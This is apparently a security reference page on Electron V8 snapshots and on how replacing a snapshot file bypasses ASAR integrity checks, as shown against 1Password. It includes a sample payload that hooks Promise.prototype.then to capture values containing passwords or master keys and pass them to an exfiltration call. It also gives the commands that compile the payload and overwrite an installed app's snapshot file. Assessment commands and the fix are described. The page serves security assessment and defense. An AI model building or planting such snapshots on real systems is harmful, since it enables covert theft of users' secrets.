---
title: V8 Snapshots
description: V8 heap serialization in Electron — how snapshots work, performance use case, and CVE-2025-55305 backdooring attack
---

# V8 Snapshots

V8 snapshots are a startup performance optimization. Instead of parsing and compiling JavaScript from scratch on every launch, Electron can restore a pre-compiled V8 heap state from a binary blob. For large apps, this saves hundreds of milliseconds.

They also create an attack primitive that bypasses ASAR integrity validation. Because snapshots are loaded *before* the ASAR integrity check runs, an attacker who replaces a snapshot file can execute arbitrary code in an app that considers itself tamper-protected.

---

## How They Work

```
Build time:
  JavaScript source → V8 parse + compile → serialize heap → snapshot_blob.bin

Runtime:
  snapshot_blob.bin → restore V8 heap (fast) → execute
                    ↑ this happens BEFORE app.asar integrity check
```

The snapshot binary contains serialized V8 internals: compiled bytecode, function objects, internal data structures. Not readable as source code, but executable by V8.

---

## Where Snapshot Files Live

```
app/
├── resources/
│   ├── app.asar                  ← ASAR integrity covers this
│   └── v8_context_snapshot.bin   ← NOT covered
├── snapshot_blob.bin             ← NOT covered
└── v8_snapshot_blob.bin          ← NOT covered (app-specific, optional)
```

Some apps generate custom snapshots to include their startup JavaScript for faster initialization. GitHub Desktop and VS Code use `electron-link` for this purpose.

---

## The Backdooring Attack

Trail of Bits demonstrated this against 1Password (CVE-2025-55305). The attack works because:

1. Snapshot files are not part of `app.asar` → not covered by ASAR integrity fuse
2. Snapshot is loaded before `app.asar` integrity check runs
3. Code in the snapshot executes in the main process with full Node.js access

```
Attack flow:
  Attacker writes malicious v8_snapshot_blob.bin
         │
         ▼
  App starts:
    V8 loads snapshot → malicious code runs ← BEFORE integrity check
    ASAR integrity check runs → app.asar unmodified → PASSES
    App code runs normally → user suspects nothing
```

The integrity check passes. The tamper protection claim was technically accurate about `app.asar`. It was silent about everything else that executes first.

---

## Building a Malicious Snapshot

```bash
# Create payload (runs before any app code):
cat > /tmp/malicious.js << 'EOF'
// Hook Promise.prototype.then — intercepts all async operations in the app
const origThen = Promise.prototype.then;
Promise.prototype.then = function(onFulfilled, onRejected) {
  const wrapped = onFulfilled ? function(value) {
    // Inspect resolved values for sensitive data:
    if (value && typeof value === 'object') {
      const s = JSON.stringify(value);
      if (s.includes('password') || s.includes('masterKey')) {
        exfiltrate(s);
      }
    }
    return onFulfilled(value);
  } : undefined;
  return origThen.call(this, wrapped, onRejected);
};
EOF

# Compile to snapshot (requires electron-mksnapshot):
electron-mksnapshot /tmp/malicious.js --output /tmp/evil_snapshot.bin

# Deploy:
cp /tmp/evil_snapshot.bin /Applications/Target.app/Contents/Resources/v8_context_snapshot.bin
```

Next launch: malicious code runs, integrity check passes, user is unaware.

---

## Why the Attack is Hard to Detect

- The snapshot binary is not JavaScript source — can't diff it easily
- The app behaves completely normally
- The integrity check logs show "PASSED"
- Standard file change monitoring focused on `app.asar` misses it
- The attack survives app updates that only replace `app.asar`

---

## CVE-2025-55305: 1Password

**Affected:** 1Password Electron desktop app pre-8.11.8-40
**Researcher:** Trail of Bits
**Impact:** Local attacker can read vault contents via snapshot injection, bypassing ASAR integrity protection

1Password specifically advertised ASAR integrity as a tamper-protection mechanism. Trail of Bits showed that protection didn't cover the snapshot vector, allowing an attacker with local write access to the snapshot file to exfiltrate vault data transparently.

**Fix:** 1Password added independent snapshot integrity validation — the snapshot hash is now embedded in the binary at build time, checked before the snapshot loads.

---

## The `LoadBrowserProcessSpecificV8Snapshot` Fuse

This fuse lets the main (browser) process load a separate snapshot from renderer processes. This increases the snapshot attack surface from one file to two — and the main process snapshot runs with full Node.js access.

---

## Finding Snapshots During an Assessment

```bash
# Find snapshot files in a target app:
find /path/to/app -name "*.bin" -o -name "*snapshot*" 2>/dev/null | grep -v ".pyc"

# Check if app generates custom snapshots at build time:
grep -r "electron-mksnapshot\|v8-compile-cache\|electron-link" package.json

# Check fuse state:
npx @electron/fuses read --app /path/to/app

# Does the app validate snapshot integrity independently?
# (Check startup code for hash checks on .bin files)
grep -rn "snapshot\|v8_context" --include="*.js" . | grep -E "hash\|hmac\|integrity\|verify"
```

The research question to ask on any app with ASAR integrity enabled: *what else loads before the integrity check?* If snapshot files are present and not independently validated, the ASAR integrity claim is weaker than advertised.
